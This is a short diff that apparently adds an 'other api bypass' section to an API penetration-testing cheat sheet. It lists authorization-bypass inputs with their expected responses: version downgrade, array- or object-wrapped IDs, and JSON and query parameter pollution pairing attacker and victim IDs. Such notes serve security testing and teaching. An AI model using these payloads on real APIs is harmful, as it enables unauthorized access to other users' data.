@@ -98,3 +98,20 @@ Try to use the following symbols as wildcards: *, %, _, .
 /api/users/_
 /api/users/.
 ```
+
+### other api bypass
+
+```
+/v3/users_data/1234 --> 403 Forbidden
+/v1/users_data/1234 --> 200 OK
+
+{“id”:111} --> 401 Unauthriozied
+{“id”:[111]} --> 200 OK
+
+
+{“id”:111} --> 401 Unauthriozied
+{“id”:{“id”:111}} --> 200 OK
+
+{"user_id":"<legit_id>","user_id":"<victims_id>"} (JSON Parameter Pollution)
+user_id=ATTACKER_ID&user_id=VICTIM_ID (Parameter Pollution)
+```
